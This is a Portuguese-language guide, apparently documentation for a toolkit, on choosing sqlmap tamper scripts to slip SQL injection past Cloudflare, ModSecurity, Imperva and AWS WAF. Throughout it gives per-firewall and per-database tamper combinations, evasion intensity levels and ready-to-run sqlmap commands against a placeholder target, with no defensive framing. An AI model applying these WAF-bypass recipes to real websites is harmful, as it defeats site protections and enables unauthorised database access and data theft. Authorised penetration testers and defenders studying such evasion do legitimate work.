# Guia de Seleção de Tampers

## Tampers Essenciais

| Tamper | Função | Compatibilidade |
|--------|--------|----------------|
| `space2comment` | Espaços → `/**/` | Todos |
| `randomcase` | AlEaTóRiO MaIúScUlO | Todos |
| `charencode` | URL encoding | Todos |
| `between` | `>` → `NOT BETWEEN 0 AND` | Todos |
| `chardoubleencode` | Dupla codificação URL | Todos |
| `space2randomblank` | Espaços → chars brancos aleatórios | Todos |
| `modsecurityzeroversioned` | `/*!00000*/` | MySQL ONLY |
| `space2mssqlblank` | Espaços alternativos | MSSQL ONLY |
| `greatest` | `>` → `GREATEST()` | MySQL, PostgreSQL |
| `percentage` | `S%E%L%E%C%T` | MSSQL ONLY |

## Seleção por WAF

### Cloudflare
```bash
--tamper=space2comment,randomcase,charencode
```

### ModSecurity
```bash
# MySQL
--tamper=modsecurityzeroversioned,space2comment,randomcase

# MSSQL
--tamper=space2mssqlblank,randomcase,between

# PostgreSQL/Oracle
--tamper=space2comment,randomcase,between
```

### Imperva
```bash
# MySQL
--tamper=space2comment,randomcase,between,greatest,charencode

# MSSQL
--tamper=space2mssqlblank,randomcase,between,charencode
```

### AWS WAF
```bash
--tamper=charencode,randomcase,between,space2comment
```

## Seleção Automática

```bash
# Via vlad.py
python vlad.py tamper --waf cloudflare --dbms mysql

# Via seletor_tamper.py
python utils/seletor_tamper.py --waf modsecurity --dbms mssql

# Listar WAFs suportados
python utils/seletor_tamper.py --listar-wafs
```

## Níveis de Evasão

| Nível | Tampers | Uso |
|-------|---------|-----|
| Leve (2) | space2comment,randomcase | WAF simples |
| Padrão (3) | + charencode ou between | WAF moderado |
| Pesado (5+) | Todos disponíveis | WAF agressivo |

```bash
# Nível leve
python utils/seletor_tamper.py --waf cloudflare --nivel leve

# Nível pesado
python utils/seletor_tamper.py --waf imperva --nivel pesado
```

## Teste de Tampers

```bash
# Testar tamper específico
sqlmap -u "http://alvo.com/?id=1" \
  --tamper=space2comment,randomcase \
  --test-filter="UNION" \
  --batch -v 3

# Ver payload gerado
sqlmap -u "http://alvo.com/?id=1" \
  --tamper=charencode \
  --level=1 \
  --batch -v 4
```
